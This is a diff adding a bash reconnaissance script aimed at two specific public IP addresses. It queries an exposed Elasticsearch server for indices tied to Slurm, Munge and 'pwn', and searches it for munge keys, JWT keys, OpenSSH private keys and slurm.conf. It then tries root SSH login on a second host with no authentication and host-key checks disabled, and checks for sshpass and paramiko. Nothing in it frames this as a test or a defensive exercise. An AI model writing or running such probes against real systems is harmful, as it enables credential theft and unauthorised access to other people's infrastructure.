@@ -1,0 +1,18 @@
+#!/bin/bash
+exec 2>&1
+echo "=== SEAT $(hostname) $(date -u +%FT%TZ)"
+echo "--- ES indices"
+curl -sS -m 8 "http://117.148.167.132:9200/_cat/indices?h=index,docs.count,store.size&s=store.size:desc" | head -30
+echo "--- ES slurm/munge indices"
+curl -sS -m 8 "http://117.148.167.132:9200/_cat/indices?h=index" | grep -iE "slurm|munge|job|pwn|6817|6818" | head -30
+echo "--- ES search munge/jwt key terms (top 10 hits, fields only)"
+curl -sS -m 10 -H 'Content-Type: application/json' -X POST "http://117.148.167.132:9200/_search?size=10" -d '{"query":{"query_string":{"query":"munge.key OR jwt.key OR \"BEGIN OPENSSH PRIVATE KEY\" OR \"MUNGE KEY\" OR slurm.conf"}},"_source":false}' | head -c 1200; echo
+echo "--- SSH methods .227"
+which ssh sshpass python3; timeout 10 ssh -o BatchMode=yes -o PreferredAuthentications=none -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=5 root@117.148.167.227 true 2>&1 | tail -3
+echo "--- sshpass?"
+python3 - <<'PY'
+try:
+ import paramiko; print("paramiko OK")
+except Exception as e: print("paramiko NO",e)
+PY
+echo "=== DONE"
